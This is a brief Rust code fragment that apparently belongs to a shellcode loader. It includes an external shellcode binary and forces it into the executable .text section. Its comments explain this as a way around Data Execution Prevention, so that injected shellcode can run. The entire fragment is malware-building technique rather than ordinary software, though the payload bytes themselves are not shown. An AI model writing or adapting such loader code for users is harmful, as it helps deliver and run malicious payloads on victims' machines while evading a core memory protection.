






pub const ONIONS: u32 = 1024_u32;
pub const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.bin"); //-- includes a file as a reference to a byte array of a binary file in form &[u8]
pub const SHELLCODE_LENGTH: usize = SHELLCODE_BYTES.len();
//// DEP (Data Execution Prevention) prevents code from being run from data pages such as the default heap, stacks, and memory pools, 
///      if an application attempts to run code from a data page that is protected, a memory access violation exception occurs, 
//       and if the exception is not handled, the calling process is terminated.
//// shellcodes might be in non executable section inside the memory 
//// dereferencing requires known size thus we must dereference the loaded shellcode int [u8; SHELLCODE_LENGTH]
//// we must dereference the &[u8] shellcode to inject the buffer itself otherwise the reference of the buffer will be injected  
#[no_mangle]
#[link_section=".text"] //// means we're executing the shellcode inside the .text section of the memory
pub static SHELLCODE: [u8; SHELLCODE_LENGTH] = *include_bytes!("../shellcode.bin"); //// includes a file as a reference to a byte array of a binary file thus we must dereference it in order to coerce it into [u8]
